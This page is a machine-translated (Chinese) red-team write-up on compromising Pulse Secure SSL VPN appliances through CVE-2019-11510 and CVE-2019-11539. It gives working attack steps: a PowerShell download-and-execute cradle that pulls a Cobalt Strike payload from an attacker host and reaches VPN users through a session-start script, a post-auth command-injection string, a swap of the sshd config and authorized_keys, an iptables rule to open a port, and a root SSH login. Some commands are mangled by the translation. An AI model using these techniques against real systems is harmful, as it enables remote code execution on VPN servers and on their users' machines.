<html>
<head>
<title>Red Teamer’s Guide to Pulse Secure SSL VPN</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Red Teamer的脉冲安全SSL VPN指南</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/pulse-secure-ssl-vpn-post-auth-rce-to-ssh-shell-2b497d35c35b?source=collection_archive---------0-----------------------#2019-09-04">https://infosecwriteups.com/pulse-secure-ssl-vpn-post-auth-rce-to-ssh-shell-2b497d35c35b?source=collection_archive---------0-----------------------#2019-09-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="7eae" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">介绍</h1><p id="5d0c" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">这篇文章是Orange Tsai ( <a class="ae lj" href="https://twitter.com/orange_8361" rel="noopener ugc nofollow" target="_blank"> orange_8361 </a>)和Meh Chang ( <a class="ae lj" href="https://twitter.com/mehqq_" rel="noopener ugc nofollow" target="_blank"> mehqq_ </a>)就攻击Pulse Secure SSL VPN所做的探索和深入研究中与各种黑客合作的集体成果。这项研究主要由艾丽莎·埃雷拉(<a class="ae lj" href="https://twitter.com/Alyssa_Herrera_" rel="noopener ugc nofollow" target="_blank">艾丽莎·埃雷拉_ </a>)、贾斯汀·瓦格纳(<a class="ae lj" href="https://twitter.com/0xDezzy" rel="noopener ugc nofollow" target="_blank"> 0xDezzy </a>)和米伊美(<a class="ae lj" href="https://twitter.com/XMPPwocky" rel="noopener ugc nofollow" target="_blank"> XMPPwocky </a>)进行。此外，我们还得到了Rich Warren(<a class="ae lj" href="https://twitter.com/buffaloverflow" rel="noopener ugc nofollow" target="_blank">buffaloverflow</a>)的帮助，实现了漏洞利用的自动化。我们将专注于两个主题，主要是扩展Orange Tsai在客户端登录后的文件执行上演示的初始概念验证的功能，以及演示我们如何使用CVE-2019–11539获得具有root权限的SSH shell。在后面的博客文章中，我将讨论米伊美和我如何能够为CVE-2019–11510创建一个概念证明，后来用于构建贾斯汀·瓦格纳创建的漏洞利用模块。</p><h1 id="0790" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated"><strong class="ak">滥用登录脚本功能弹出外壳</strong></h1><p id="c491" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">Pulse secure connect包含允许管理员设置用户客户端的功能，以便在用户登录或注销其VPN实例时自动执行本地托管的文件。</p><p id="0b3f" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">此功能允许您设置要执行的脚本，这对于红队队员或恶意演员来说相当有吸引力。我们最初试图在执行power-shell或cmd时滥用这一功能来执行args，尽管这没有成功。我们后来从<a class="ae lj" href="https://twitter.com/XMPPwocky" rel="noopener ugc nofollow" target="_blank">米伊美</a>那里得到了一个想法，尝试UNC路径来查询一个SMB服务器来执行攻击，这为我们解决了问题。</p><p id="40fc" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">这是我们所做的，我们首先设置一个SMB服务器，这可以通过快速的google搜索来完成。然后我们将托管一个批处理文件，该文件将使用power-shell在目标上查询和执行我们的shell，我们使用了一个cobaltstrike信标。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi lp"><img src="../Images/585f12a9baab19a261738dfe927e3a19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qaTvfmH2cK90EpnDsOhH5w.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">批处理脚本的代码</figcaption></figure><p id="5cbf" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">我们用于批处理脚本的代码如下。</p><pre class="lq lr ls lt gt mf mg mh mi aw mj bi"><span id="a5a2" class="mk jo iq mg b gy ml mm l mn mo">@echo off <br/>powershell.exe -nop -w hidden -c “IEX ((new-object net.webclient).downloadstring(‘http://your-ip/payload))”</span></pre><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mp"><img src="../Images/ac11b5ea06f4f62af33eeec008f4172a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2OmScTLJPxIQya6bkOh1Rw.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">设置钴罢工</figcaption></figure><p id="8a42" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">现在，在我们的pulse安全实例上，我们将使用管理凭据登录。您可以通过利用CVE-2019–11510来获取包含会话ID、明文凭据或您可以破解的哈希的文件。<br/>然后，我们将导航至用户- &gt;用户角色- &gt; VPN隧道- &gt; Windows:会话启动脚本。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mq"><img src="../Images/26707db2604cd57a5a3fd49730cb1919.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hC3PdTODIVh86mlVckKdKA.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">会话开始脚本端点</figcaption></figure><p id="3bd5" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">在这里，我们可以输入包含批处理文件的SMB服务器的UNC路径，该批处理文件将查询我们的shell并执行它。应该看起来像下面的图像</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mr"><img src="../Images/3d6a832517ba0cda7bbf154de82cee58.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r-Zv5ilCQW9XoFO3Jmk2ew.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">修改了与我们的服务器的会话启动脚本</figcaption></figure><p id="2f34" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">从这里，任何登录到受损vpn实例的用户都将执行我们的有效负载，并随后访问该用户的机器。我们还在视频演示中加入了屏幕截图</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi ms"><img src="../Images/74d299662a1e64c21ba06d21d7fcfffb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QaFGiURYZBWvLtXXcL0n2g.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">用户已登录</figcaption></figure><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mt"><img src="../Images/ccd004432b6cfa73feef04f4081b3c0d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XtyyuOCUU8RvIqxB75RgXw.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">用户一登录就执行我们的shell。</figcaption></figure><figure class="lq lr ls lt gt lu"><div class="bz fp l di"><div class="mu mv l"/></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">这种利用的视频演示</figcaption></figure><h1 id="4512" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">拥有脉冲安全连接CVE-2019–11539获得SSH根壳。</h1><p id="26ac" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">现在有趣的部分是，我们如何能够利用一个post-auth漏洞来获得一个具有root权限的SSH shell。根据前半部分，我们已经提到获得一个未打补丁的脉冲授权并不难，所以我们将进入我们如何拥有这个盒子。</p><p id="d7d6" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">我们在研究过程中发现，我们拥有修改ssh密钥和SSH密钥配置以及IP表的权限，这将允许我们无缝地获得具有root访问权限的SSH shell。</p><p id="3ada" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">为了快速刷新，post-auth命令注入要求我们提交以下命令</p><pre class="lq lr ls lt gt mf mg mh mi aw mj bi"><span id="9b19" class="mk jo iq mg b gy ml mm l mn mo">-r$x=”Our command”,system$x# 2&gt;/data/runtime/tmp/tt/setcookie.thtml.ttc &lt;</span></pre><p id="366b" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">可以在维护-&gt;故障排除-&gt; TCP转储中找到。</p><figure class="lq lr ls lt gt lu gh gi paragraph-image"><div role="button" tabindex="0" class="lv lw di lx bf ly"><div class="gh gi mw"><img src="../Images/04e77b4b0aa5d1b2a8873dd4fa4305fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1272/format:webp/1*Gv0eaf-U9BBcJCJbSdD4Ag.png"/></div></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">我们命令的注入—单击开始嗅探提交</figcaption></figure><p id="d4ec" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">页面会给我们一个错误，但是命令被处理，然后我们会请求<a class="ae lj" href="https://your-server/dana-na/auth/setcookie.cgi" rel="noopener ugc nofollow" target="_blank">https://your-server/Dana-na/auth/set cookie . CGI</a>来执行命令。每次我们想对服务器执行查询时，我们都需要重复这个过程，否则我们的命令就不会被执行。</p><p id="6fd5" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">此升级旨在修改机器的sshd配置，并将我们自己的ssh密钥添加到系统中，从而授予在中进行SSH的能力。我们专门针对/中的授权密钥。ssh/和/etc/文件夹中的cloud_sshd_config。Authorized keys是允许ssh进入机器的密钥，而config sshd文件是ssh守护进程的配置文件。</p><p id="5140" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">现在，从这里开始执行后期开发以获得我们的ssh shell是相当简单的。首先，我们用cp cloud_sshd_config和。bak扩展名，这样我们就可以备份原始文件。您应该创建一个如下所示的sshd配置文件。</p><pre class="lq lr ls lt gt mf mg mh mi aw mj bi"><span id="4694" class="mk jo iq mg b gy ml mm l mn mo">Protocol 2<br/>UsePrivilegeSeparation no<br/>RSAAuthentication yes<br/>PubkeyAuthentication yes<br/>ClientAliveInterval 180<br/>ListenAddress 0.0.0.0</span></pre><p id="a0d8" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">在这之后，我们将把我们自己的authorized_keys以及前面描述的sshd配置文件保存到tmp文件夹中，因为我们已经备份了原始文件，所以现在可以安全地将我们自己的文件移动到服务器并覆盖它。从您自己的服务器上将其卷曲，然后将文件移动到目录中，这是最简单的方法，而不是通过命令注入来修改它。<br/>在这里，我们请求修改IPtables来打开端口，这可以通过下面的命令来完成</p><pre class="lq lr ls lt gt mf mg mh mi aw mj bi"><span id="c352" class="mk jo iq mg b gy ml mm l mn mo">iptables -A INPUT -p tcp — dport PORT -j ACCEPT</span></pre><p id="80a5" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">为了完成我们的更改，我们需要重新启动sshd-ive服务以使我们的修改生效。</p><pre class="lq lr ls lt gt mf mg mh mi aw mj bi"><span id="b94b" class="mk jo iq mg b gy ml mm l mn mo">kill -SIGHUP $(pgrep -f “sshd-ive</span></pre><p id="dbaf" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">一旦这样做了，我们现在可以ssh到我们现在带壳的盒子。</p><pre class="lq lr ls lt gt mf mg mh mi aw mj bi"><span id="08d8" class="mk jo iq mg b gy ml mm l mn mo">ssh root@host -p6667</span></pre><p id="9fac" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated">这将为我们提供一个根ssh shell，无需进一步升级。如上所述，这需要花费一些时间来手动完成，因为每次我们想要启动一个命令时，我们需要发出两个请求。这可以很容易地编写脚本，我们准备了下面的演示来展示从简单的管理员访问Pulse Secure SSL VPN到获得服务器的root访问权限的能力。我们将额外发布我们的脚本来利用这一点，可以在<a class="ae lj" href="https://github.com/0xDezzy/CVE-2019-11539" rel="noopener ugc nofollow" target="_blank">https://github.com/0xDezzy/CVE-2019-11539</a>找到</p><figure class="lq lr ls lt gt lu"><div class="bz fp l di"><div class="mu mv l"/></div><figcaption class="mb mc gj gh gi md me bd b be z dk translated">使用CVE自动化后期开发-2019–11539</figcaption></figure></div><div class="ab cl mx my hu mz" role="separator"><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc nd"/><span class="na bw bk nb nc"/></div><div class="ij ik il im in"><p id="93c1" class="pw-post-body-paragraph kl km iq kn b ko lk kq kr ks ll ku kv kw lm ky kz la ln lc ld le lo lg lh li ij bi translated"><em class="ne">关注</em> <a class="ae lj" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ne"> Infosec报道</em> </a> <em class="ne">获取更多此类精彩报道。</em></p><div class="nf ng gp gr nh ni"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nj ab fo"><div class="nk ab nl cl cj nm"><h2 class="bd ir gy z fp nn fr fs no fu fw ip bi translated">信息安全报道</h2><div class="np l"><h3 class="bd b gy z fp nn fr fs no fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="nq l"><p class="bd b dl z fp nn fr fs no fu fw dk translated">medium.com</p></div></div><div class="nr l"><div class="ns l nt nu nv nr nw lz ni"/></div></div></a></div></div></div>    
</body>
</html>